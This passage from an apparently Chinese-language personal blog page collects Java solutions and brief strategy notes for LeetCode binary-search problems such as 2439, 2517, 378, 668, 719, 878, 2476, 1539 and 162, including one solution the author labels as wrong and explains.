class="literal">true</span>;</span><br><span class="line">        <span class="type">int</span>[][] directions = <span class="keyword">new</span> <span class="title class_">int</span>[][]&#123;&#123;-<span class="number">1</span>, <span class="number">0</span>&#125;, &#123;<span class="number">1</span>, <span class="number">0</span>&#125;, &#123;<span class="number">0</span>, <span class="number">1</span>&#125;, &#123;<span class="number">0</span>, -<span class="number">1</span>&#125;&#125;;</span><br><span class="line">        <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">sz</span> <span class="operator">=</span> queue.size();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; sz; i++) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">                <span class="type">int</span> <span class="variable">row</span> <span class="operator">=</span> num / n;</span><br><span class="line">                <span class="type">int</span> <span class="variable">col</span> <span class="operator">=</span> num % n;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">newRow</span> <span class="operator">=</span> row + directions[j][<span class="number">0</span>];</span><br><span class="line">                    <span class="type">int</span> <span class="variable">newCol</span> <span class="operator">=</span> col + directions[j][<span class="number">1</span>];</span><br><span class="line">                    <span class="keyword">if</span> (newRow &gt;= <span class="number">0</span> &amp;&amp; newRow &lt; m &amp;&amp; newCol &gt;= <span class="number">0</span> &amp;&amp; newCol &lt; n &amp;&amp; !visited[newRow][newCol] &amp;&amp; Math.abs(heights[newRow][newCol] -heights[row][col]) &lt;= target) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(newRow == m - <span class="number">1</span> &amp;&amp; newCol == n - <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                        visited[newRow][newCol] = <span class="literal">true</span>;</span><br><span class="line">                        queue.offer(newRow * n + newCol);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>todo：之后使用并查集和最短路做法解决</p>
<h3 id="2439-最小化数组中的最大值"><a href="#2439-最小化数组中的最大值" class="headerlink" title="2439. 最小化数组中的最大值"></a><a href="https://leetcode.cn/problems/minimize-maximum-of-array/">2439. 最小化数组中的最大值</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">二分，low = 0， high = 数组最大值</span><br><span class="line">题目意思是小+1，大减一。</span><br><span class="line">倒着遍历，找到不和调减就减少当前值，增加前面值</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minimizeArrayValue</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">low</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">high</span> <span class="operator">=</span> Arrays.stream(nums).max().getAsInt();</span><br><span class="line">        <span class="keyword">while</span> (low &lt; high)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> low + (high - low) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(check(nums, mid))&#123;</span><br><span class="line">                high = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> low = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> low;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">long</span> target)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">long</span> <span class="variable">record</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> n - <span class="number">1</span>; i &gt;= <span class="number">1</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] + record &lt;= target)&#123;</span><br><span class="line">                record = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            record = (record + nums[i]) - target;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums[<span class="number">0</span>] + record &lt;= target;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="最大化最小值"><a href="#最大化最小值" class="headerlink" title="最大化最小值"></a>最大化最小值</h2><h3 id="2517-礼盒的最大甜蜜度"><a href="#2517-礼盒的最大甜蜜度" class="headerlink" title="2517. 礼盒的最大甜蜜度"></a><a href="https://leetcode.cn/problems/maximum-tastiness-of-candy-basket/">2517. 礼盒的最大甜蜜度</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">排序+二分</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maximumTastiness</span><span class="params">(<span class="type">int</span>[] price, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        Arrays.sort(price);</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> price.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">low</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">high</span> <span class="operator">=</span> price[n - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">while</span> (low &lt; high)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> low + (high - low + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(check(price, k, mid))&#123;</span><br><span class="line">                low = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> high = mid - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> low;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(<span class="type">int</span>[] price, <span class="type">int</span> k, <span class="type">int</span> target)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">preVal</span> <span class="operator">=</span> price[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; price.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(price[i] - preVal &gt;= target)&#123;</span><br><span class="line">                count++;</span><br><span class="line">                preVal = price[i];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(count &gt;= k) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><del>这题怎么有两千多分的，感觉1800吧</del></p>
<h2 id="第-K-小-x2F-大"><a href="#第-K-小-x2F-大" class="headerlink" title="第 K 小&#x2F;大"></a>第 K 小&#x2F;大</h2><h3 id="378-有序矩阵中第-K-小的元素"><a href="#378-有序矩阵中第-K-小的元素" class="headerlink" title="378. 有序矩阵中第 K 小的元素"></a><a href="https://leetcode.cn/problems/kth-smallest-element-in-a-sorted-matrix/">378. 有序矩阵中第 K 小的元素</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">二分+分割线查找</span><br><span class="line">等价于找到大于等于数组中k个元素的最小值，所以得缩小右边</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">kthSmallest</span><span class="params">(<span class="type">int</span>[][] matrix, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> matrix.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> matrix[<span class="number">0</span>].length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">low</span> <span class="operator">=</span> matrix[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">high</span> <span class="operator">=</span> matrix[m - <span class="number">1</span>][n - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">while</span> (low &lt; high)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> low + (high - low) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(check(matrix, k, mid, m, n))&#123;</span><br><span class="line">                high = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> low = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> low;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(<span class="type">int</span>[][] matrix, <span class="type">int</span> k, <span class="type">int</span> num, <span class="type">int</span> m, <span class="type">int</span> n)</span>&#123;</span><br><span class="line">        <span class="comment">//判断左边大于等于num的数是否小于等于k，因为要找最小的大于等于矩阵中k个元素的值，所以要缩右边</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> n - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; m &amp;&amp; j &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">while</span> (j &gt;=<span class="number">0</span> &amp;&amp; matrix[i][j] &gt; num)&#123;</span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line">            count += j + <span class="number">1</span>;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count &gt;= k;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="668-乘法表中第k小的数"><a href="#668-乘法表中第k小的数" class="headerlink" title="668. 乘法表中第k小的数"></a><a href="https://leetcode.cn/problems/kth-smallest-number-in-multiplication-table/">668. 乘法表中第k小的数</a></h3><p>跟378特别像</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findKthNumber</span><span class="params">(<span class="type">int</span> m, <span class="type">int</span> n, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">low</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">high</span> <span class="operator">=</span> m * n;</span><br><span class="line">        <span class="keyword">while</span> (low &lt; high)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> low + (high - low) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(check(m, n, k, mid))&#123;</span><br><span class="line">                high = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> low = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> low;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(<span class="type">int</span> m, <span class="type">int</span> n, <span class="type">int</span> k, <span class="type">int</span> num)</span>&#123;</span><br><span class="line">        <span class="comment">//判断左边小于等于num的数是否小于等于k</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> n;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt;= m &amp;&amp; j &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">while</span> (j &gt; <span class="number">0</span> &amp;&amp; i * j &gt; num)&#123;</span><br><span class="line">                j--;</span><br><span class="line">            &#125;</span><br><span class="line">            count += j;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count &gt;= k;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="719-找出第-K-小的数对距离"><a href="#719-找出第-K-小的数对距离" class="headerlink" title="719. 找出第 K 小的数对距离"></a><a href="https://leetcode.cn/problems/find-k-th-smallest-pair-distance/">719. 找出第 K 小的数对距离</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">排序 + 二分</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">smallestDistancePair</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">low</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">high</span> <span class="operator">=</span> nums[n - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">while</span> (low &lt; high)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> low + (high - low) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(check(nums, k, mid))&#123;</span><br><span class="line">                high = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> low = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> low;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> k, <span class="type">int</span> target)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; n)&#123;</span><br><span class="line">            <span class="keyword">while</span> (j &lt; n &amp;&amp; nums[j] - nums[i] &lt;= target)&#123;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            count += (j - i - <span class="number">1</span>);</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count &gt;= k;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 1 2 3 4 5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 0 1 2 3 4</span></span><br><span class="line"><span class="comment">// 0 0 1 2 3</span></span><br><span class="line"><span class="comment">// 0 0 0 1 2</span></span><br><span class="line"><span class="comment">// 0 0 0 0 1</span></span><br><span class="line"><span class="comment">// 0 0 0 0 0</span></span><br></pre></td></tr></table></figure>

<p>细节挺麻烦得，debug了挺久</p>
<h3 id="878-第-N-个神奇数字"><a href="#878-第-N-个神奇数字" class="headerlink" title="878. 第 N 个神奇数字"></a><a href="https://leetcode.cn/problems/nth-magical-number/">878. 第 N 个神奇数字</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">感觉像是数学题，直接求结果就行。（肯定可行的）</span><br><span class="line">二分专题就二分方法做了</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">nthMagicalNumber</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">MOD_NUM</span> <span class="operator">=</span> (<span class="type">int</span>) (<span class="number">1e9</span> + <span class="number">7</span>);</span><br><span class="line">        <span class="type">long</span> <span class="variable">low</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">        <span class="type">long</span> <span class="variable">gcdNum</span> <span class="operator">=</span> gcd(a, b);</span><br><span class="line">        <span class="type">long</span> <span class="variable">lcmNum</span> <span class="operator">=</span> a / gcdNum * b;</span><br><span class="line">        <span class="type">long</span> <span class="variable">high</span> <span class="operator">=</span> (<span class="type">long</span>) a * b * n;</span><br><span class="line">        <span class="keyword">while</span> (low &lt; high)&#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">mid</span> <span class="operator">=</span> low + (high - low) / <span class="number">2</span>;</span><br><span class="line">            <span class="type">long</span> <span class="variable">count</span> <span class="operator">=</span> mid / a + mid / b - mid / lcmNum;</span><br><span class="line">            <span class="keyword">if</span>(count &gt;= n)&#123;</span><br><span class="line">                high = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> low = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">int</span>) (low % MOD_NUM);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">long</span> <span class="title function_">gcd</span><span class="params">(<span class="type">long</span> a, <span class="type">long</span> b)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a % b == <span class="number">0</span> ? b : gcd(b, a % b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="2476-二叉搜索树最近节点查询"><a href="#2476-二叉搜索树最近节点查询" class="headerlink" title="2476. 二叉搜索树最近节点查询"></a><a href="https://leetcode.cn/problems/closest-nodes-queries-in-a-binary-search-tree/">2476. 二叉搜索树最近节点查询</a></h3><p>错误解法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">closestNodes</span><span class="params">(TreeNode root, List&lt;Integer&gt; queries)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> queries.size();</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Integer query : queries) &#123;</span><br><span class="line">            list.add(search(root, query));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    List&lt;Integer&gt; <span class="title function_">search</span><span class="params">(TreeNode root, <span class="type">int</span> query)</span> &#123;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> root;</span><br><span class="line">        <span class="type">int</span> <span class="variable">minNum</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxNum</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br><span class="line">        <span class="keyword">while</span> (cur != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (query == cur.val) <span class="keyword">return</span> Arrays.asList(query, query);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (cur.val &lt; query) &#123;</span><br><span class="line">                minNum = Integer.max(minNum, cur.val);</span><br><span class="line">                cur = cur.right;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                maxNum = Integer.min(maxNum, cur.val);</span><br><span class="line">                cur = cur.left;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Arrays.asList(minNum, maxNum== Integer.MAX_VALUE ? -<span class="number">1</span> : maxNum);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是二叉搜索树，不是二叉平衡树，可能左右不均匀，甚至退化成链表，所以最好是通过中序遍历保存一个有序数组在二分</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">closestNodes</span><span class="params">(TreeNode root, List&lt;Integer&gt; queries)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> queries.size();</span><br><span class="line">        travel(root);</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Integer query : queries) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">leftIndex</span> <span class="operator">=</span> upper_bound(query);</span><br><span class="line">            <span class="keyword">if</span>(leftIndex == -<span class="number">1</span>) res.add(Arrays.asList(-<span class="number">1</span>, list.get(<span class="number">0</span>)));</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(query.equals(list.get(leftIndex)))&#123;</span><br><span class="line">                res.add(Arrays.asList(query, query));</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(leftIndex == list.size() - <span class="number">1</span>)&#123;</span><br><span class="line">                res.add(Arrays.asList(list.get(leftIndex), -<span class="number">1</span>));</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                res.add(Arrays.asList(list.get(leftIndex), list.get(leftIndex + <span class="number">1</span>)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">travel</span><span class="params">(TreeNode root)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">        travel(root.left);</span><br><span class="line">        list.add(root.val);</span><br><span class="line">        travel(root.right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">upper_bound</span><span class="params">(<span class="type">int</span> target)</span>&#123;</span><br><span class="line">        <span class="comment">//nums[mid] &lt;= target</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">low</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">high</span> <span class="operator">=</span> list.size() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (low &lt; high)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> low + (high - low + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(list.get(mid) &lt;= target)&#123;</span><br><span class="line">                low = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> high = mid - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(list.get(low) &gt; target) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> low;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1539-第-k-个缺失的正整数"><a href="#1539-第-k-个缺失的正整数" class="headerlink" title="1539. 第 k 个缺失的正整数"></a><a href="https://leetcode.cn/problems/kth-missing-positive-number/">1539. 第 k 个缺失的正整数</a></h3><p>思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">二分</span><br><span class="line">对于[0,i]范围共缺失了 arr[i] - i - 1个正整数。</span><br><span class="line">因此可以二分下。考虑下二分index还是整数</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findKthPositive</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">low</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">high</span> <span class="operator">=</span> arr.length - <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//arr[mid] &gt;=k</span></span><br><span class="line">        <span class="keyword">while</span> (low &lt; high)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (low + high) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(arr[mid] - mid - <span class="number">1</span> &gt;= k)&#123;</span><br><span class="line">                high = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> low = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(arr[low] - low - <span class="number">1</span> &lt; k) <span class="keyword">return</span> arr.length + k;</span><br><span class="line">        <span class="keyword">if</span>(low == <span class="number">0</span>) <span class="keyword">return</span> k;</span><br><span class="line">        <span class="keyword">return</span> arr[low - <span class="number">1</span>] + (k - (arr[low - <span class="number">1</span>] - low));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><del>感觉不像简单题啊。。。。。</del></p>
<h3 id="162-寻找峰值"><a href="#162-寻找峰值" class="headerlink" title="162. 寻找峰值"></a><a href="https://leetcode.cn/problems/find-peak-element/">162. 寻找峰值</a></h3><p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findPeakElement</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">low</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">high</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (low &lt; high)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (low + high) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid] &lt; nums[mid + <span class="number">1</span>])&#123;</span><br><span class="line">                low = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> high = mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> low;</span><br><span class="line">    &#125;</span><br><span 